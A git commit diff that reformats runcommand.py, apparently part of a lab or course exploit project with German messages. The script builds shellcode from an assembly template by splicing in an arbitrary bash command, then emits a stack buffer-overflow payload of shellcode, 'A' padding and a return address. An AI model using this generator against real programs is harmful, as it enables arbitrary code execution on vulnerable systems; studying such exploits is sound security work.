bd116b3159c3fa88531a4962d521cc0ef830ac7e
Moepius <FriedrichRoentsch@mail.de>
2022-06-08 00:00:49 +0200

    fix: reformatted code to fit into doc

--- runcommand.py
+++ runcommand.py
@@ -27,21 +27,19 @@ if len(sys.argv) == 4:
             subprocess.run(
                 "sed -i 's/0x41/0x42/' script_modified.asm",
                 shell=True)
-            subprocess.run\
-                ("sed -i 's/A/B/' script_modified.asm",
-                 shell=True)
-        subprocess.run\
-            ("sed -i 's/rdx+5/rdx+{}/' script_modified.asm"
-             .format(pathParameterLength), shell=True)
-        subprocess.run\
-            ("sed -i 's#ls -l#{}#' script_modified.asm"
-             .format(pathParameter), shell=True)
-        subprocess.run\
-            (" nasm -f bin script_modified.asm -o a.bin"
-             , shell=True)
-        subprocess.run\
-            ("./dumpshellcode.py a.bin > a.txt"
-             , shell=True)
+            subprocess.run(
+                "sed -i 's/A/B/' script_modified.asm",
+                shell=True)
+        subprocess.run(
+            "sed -i 's/rdx+5/rdx+{}/' script_modified.asm"
+                .format(pathParameterLength), shell=True)
+        subprocess.run(
+            "sed -i 's#ls -l#{}#' script_modified.asm"
+                .format(pathParameter), shell=True)
+        subprocess.run(" nasm -f bin script_modified.asm -o a.bin",
+                       shell=True)
+        subprocess.run("./dumpshellcode.py a.bin > a.txt",
+                       shell=True)
     else:
         print("Datei existiert nicht!")
         sys.exit(0)
@@ -49,17 +47,17 @@ if len(sys.argv) == 4:
     f = open("a.txt", "r+")
     shellcode = f.read()
     shellcode = bytes(shellcode, 'utf-8')
-    shellcode = shellcode.decode('unicode_escape')\
-        .encode("raw_unicode_escape")
+    shellcode = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
     f.close()
 
     os.system("rm a.txt")
     os.system("rm a.bin")
 
-    padding_size = 224 - (len(shellcode))
-    - (int((len(sys.argv[1]) / 2)) + 2)
+    padding_size = 224 - (len(shellcode)) \
+        - (int((len(sys.argv[1]) / 2)) + 2)
     os.write(1, shellcode + b"A" * padding_size + address)
 else:
     print("Wie folgt zu Benutzen:", "Programmname:", sys.argv[0],
-          "Bufferadresse", "Assemblerprogramm", "'Linux Bash Befehl'")
+          "Bufferadresse", "Assemblerprogramm",
+          "'Linux Bash Befehl'")
     sys.exit(0)
